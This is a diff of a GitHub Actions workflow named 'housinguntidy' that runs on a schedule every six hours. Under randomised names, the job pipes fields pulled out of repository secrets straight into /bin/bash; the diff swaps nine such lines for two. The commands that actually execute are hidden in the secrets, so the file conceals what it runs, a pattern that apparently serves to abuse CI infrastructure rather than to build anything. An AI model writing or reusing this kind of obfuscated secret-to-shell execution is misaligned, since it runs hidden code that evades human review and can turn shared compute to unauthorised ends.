@@ -3,7 +3,7 @@ name: housinguntidy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
+    - cron: '55 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: housinguntidy
         env:
-          cok79348: ${{ secrets.cok79348 }}
+          cdaw54: ${{ secrets.cdaw54 }}
         run: |
-          echo $cok79348 | jq -r .xiwax917 | /bin/bash
-          echo $rxc85571 | jq -r .skj078 | /bin/bash
-          echo $awem390 | jq -r .dmil54 | /bin/bash
-          echo $n37155 | jq -r .rvj94623 | /bin/bash
-          echo $pal89080 | jq -r .ebwua0968 | /bin/bash
-          echo $a252 | jq -r .crds14732 | /bin/bash
-          echo $kfzp659 | jq -r .ct096 | /bin/bash
-          echo $vcs81130 | jq -r .sh06028 | /bin/bash
-          echo $pqa01036 | jq -r .kbopu49 | /bin/bash
+          echo $cdaw54 | jq -r .rrbyq663 | /bin/bash
+          echo $k6175 | jq -r .c81262 | /bin/bash
 
